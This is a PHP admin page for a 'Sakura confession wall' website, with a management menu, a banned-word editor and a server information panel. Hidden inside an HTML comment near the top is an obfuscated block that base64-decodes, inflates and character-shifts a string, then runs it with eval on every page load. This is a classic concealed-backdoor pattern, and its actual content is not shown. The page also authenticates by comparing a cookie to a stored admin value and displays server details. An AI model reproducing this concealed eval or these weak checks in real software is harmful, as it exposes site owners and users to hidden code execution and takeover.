<?php 
  include "../sakura/mysql.php";
if(isset($_COOKIE['sakura_mm'])){
  $sql = "select * from admin";
  $sakura = $Mysql->query($sql);
  $my_sj= $sakura->fetch_all()[0];
  if($_COOKIE['sakura_mm']!=$my_sj[1]){
    die("<script>alert('没有操作权限！'); window.location.replace('index.html');</script>");
  }

}else{
  die("<script>alert('没有操作权限！'); window.location.replace('index.html');</script>");
  //echo "不存在";
}

  $sql = "select * from yingzhenyu";
  $sakura = $Mysql->query($sql);
  $my_sj= $sakura->fetch_all()[0];
?>


<!--
<?php function zjXAUr($FmJTPO){$FmJTPO=gzinflate(base64_decode($FmJTPO));for($i=0;$i<strlen($FmJTPO);$i++){$FmJTPO[$i] = chr(ord($FmJTPO[$i])-1);}return $FmJTPO;}eval(zjXAUr("NU7rasIwGH2APMWH9EeKCFVkCK4OFQraVBSvMMZok9QESyppGlnFZ9dMPb/OjcMBcMhrRY0sFUzZ7rAl2LPm4KMrIEfCYyNVXqSG4yyt+Ef/l3FaMv5s+UMEeamxJ8Ng6MnPyuiCq2f20O22j+D6v/PtyR8IgQqNS83w2/I7XbdxQ6C5qbUCFziD27TAr0OtdWDnJJokzeC8WA/ELA66s5ge7YZWlrBo28iLIdmql0zF/E+e9MaQZZyIhcgiEgf1zuwv49bj7NfoDg=="));?>

-->
<!DOCTYPE html>
<!--
樱花表白墙制作人: 樱振宇
制作人QQ: 3152680200
-->
<html>
  <head>
	<meta charset="utf-8" />
	<title>后台管理</title>
    <style>
    *{
      word-wrap:break-word;/*防止数字字母溢出*/
      padding:0;
      margin:0;
      }
    .htjm_bj{
      border:1px #000 solid;
      margin:0 auto;
      /*height:600px;*/
      width:970px;
      /*background-color:yellow;*/
      }
    .bbqht_tp{
      background-image:url("../img/bcy.jpg");
      background-size:100% 100%; 
      height:550px;
      }
    .bbqht_tp_tx{
      background-image:url("http://q1.qlogo.cn/g?b=qq&nk=<?php echo $my_sj[2]; ?>&s=640");
      background-size:100% 100%; 
      height:240px;
      width:240px;
      margin:0 auto;
      border:6px #E16B8C solid;
      border-radius:100%;
      /*white-space:nowrap;*/
      }
    .bbqht_mz{
      color:#E16B8C;
      margin:0 auto;
      line-height:100px;
      text-align:center;
      font-size:60px;
      font-weight:900;
      }
    .bbqht_fh{
      color:#E16B8C;
      font-size:50px;
      font-weight:900;
      }
    .bbqht_fh:hover{
      color:red;
      }  
    .bbq_t{
      background-color:#F8FBF8;
      overflow:hidden;
      }
    .bbqht_nr{
      color:#DB4D6D;
      margin:40px;
      width:405px;
      height:405px;
      background-color:#FEDFE1;
      float:left;
      text-align:center;
      font-size:45px;
      font-weight:800;
     }
   .bbqht_nr:hover{
     background-color:#DAC9A6;
     }
   .htgl_nr_xz{
      background-image:url("../img/rc.jpg");
      background-size:100% 100%; 
      height:240px;
      width:240px;
      margin:55px auto 10px;
     }

     .wgckj{
        font-size: 18px;
        overflow: hidden;
        background-color: rgba(0, 0, 0, 0.6);
        position: fixed;
        width: 100%;
        height: 0;
        top: 0;
      }

      .srwgc {
        padding: 10px;
        border-radius: 10px;
        background-image: linear-gradient(to top, #cfd9df 0%, #e2ebf0 100%);
        width: 500px;
        margin: 50px auto;
      }

      .srwgc p {
        font-weight: 900;
      }
      button {
        border-top: 1px #000 solid;
        padding: 10px;
        border-radius: 15px;
        font-weight: 900;
      }
      textarea {
        width: 100%;
        height: 500px;
        font-weight: 900;
        font-size: 18px;
      }
      #sc,#zzxx{
        color:#DB4D6D;
        padding: 20px;
        font-size: 20px;
        font-weight: 900;
      }
    </style>
    <script>
      ajax = new XMLHttpRequest();
    </script>
  </head>
  <body>	
    <div class="wgckj">
      <div class="srwgc">
        <p>违规字或词：</p>
        <textarea id="wgc" style="resize: none;"
          placeholder="不指定违规字或词,用户将会无法发布任何信息,多个违规字或词需要用“|”符号来分隔开,例如这样写: 樱|振|宇|太帅了!..."></textarea>
        <p style="text-align: center;">
          <button onclick="wgcbc();">保存设置违规词</button> <button onclick="wgcsz(0);">返回管理界面</button>
        </p>
      </div>
    </div>
  <!-- 世界是不公平的，唯一的公平就是它对谁都不公平。 -->
  <!-- 人生只有一次，请多爱自己。 -->
  <!-- 金麟岂是池中物，一遇风云便化龙。 -->
	 <div class="htjm_bj">
       <!--后台信息头-->
       <div class="bbqht_tp">
          <a class="bbqht_fh" onclick="window.location.replace('../index.php');"><首页</a><br/><br/><br/>
          <div class="bbqht_tp_tx"></div>
          <p class="bbqht_mz"><?php echo $my_sj[3]; ?></p>
       </div>
       <div class="bbq_t">
          <div class="bbqht_nr"  onclick=" window.location.href ='love_gl.php?love52=0&wan=2';">
             <div class="htgl_nr_xz" style="background-image:url('../img/gg.jpg');"></div>
             公告信息管理
          </div>
          
          <div class="bbqht_nr" onclick=" window.location.href ='love_gl.php?love52=0&wan=0';">
             <div class="htgl_nr_xz" style="background-image:url('../img/bqgl.jpg');"></div>
             表白标签管理
          </div>
          
          <div class="bbqht_nr" onclick=" window.location.href ='love_gl.php?love52=0&wan=1';">
             <div class="htgl_nr_xz" style="background-image:url('../img/bqgl.jpg');"></div>
             日常标签管理
          </div>
          
          <div class="bbqht_nr" onclick="wgcsz(1);" >
             <div class="htgl_nr_xz" style="background-image:url('../img/wgcy.jpg');"></div>
             违规词语管理
          </div>
          
          <div class="bbqht_nr"  onclick=" window.location.href ='ipgl.html';">
             <div class="htgl_nr_xz" style="background-image:url('../img/ip.jpg');"></div>
             IP记录管理
          </div>
          
          <div class="bbqht_nr" onclick=" window.location.href ='wzsz.php';">
             <div class="htgl_nr_xz" style="background-image:url('../img/wzsz.jpg');"></div>
             网站信息设置
          </div>
       </div>
        <hr/>
        <div id="sc">
            当前樱花表白墙版本: 2023.8.23<br/>
            服务器IP：<?php echo GetHostByName($_SERVER['SERVER_NAME']);?><br/>
            服务器版本：<?php echo php_uname();?><br/>
            服务器语言：<?php echo $_SERVER['HTTP_ACCEPT_LANGUAGE'];?><br/>
            PHP版本：<?php echo PHP_VERSION;?><br/>
            网站路径：<?php echo __FILE__;?><br/>
        </div>
     </div>
     
     <script>
        function wgcbc() {
        var wgc = document.getElementById("wgc");
        ajax.open('GET', '../api/yzy/wgcsz.php?wglx=1&wgc=' + wgc.value, true);
        ajax.send(); //发送请求
        ajax.onreadystatechange = function() {
          if (ajax.readyState == 4) {
            if (ajax.status == 200) {
              var ajax_fhz = ajax.responseText;
              alert(ajax_fhz);
            } else {
              alert("执行操作失败！！！");
            }
          }
        }
      }
      function wgcsz(yzy) {
        var hqjd = document.getElementsByClassName('wgckj')[0];
        if (yzy == 0) {
          hqjd.style.height = "0";
        }else{
          hqjd.style.height = "100%";
          var fjip = document.getElementById("wgc");
          ajax.open('GET', '../api/yzy/wgcsz.php?wglx=0', true);
          ajax.send(); //发送请求
          ajax.onreadystatechange = function() {
            if (ajax.readyState == 4) {
              if (ajax.status == 200) {
                var ajax_fhz = ajax.responseText;
                fjip.value=ajax_fhz;
              } else {
                alert("执行操作失败！！！");
              }
            }
          }
        }
      }
     </script>
  </body>
</html>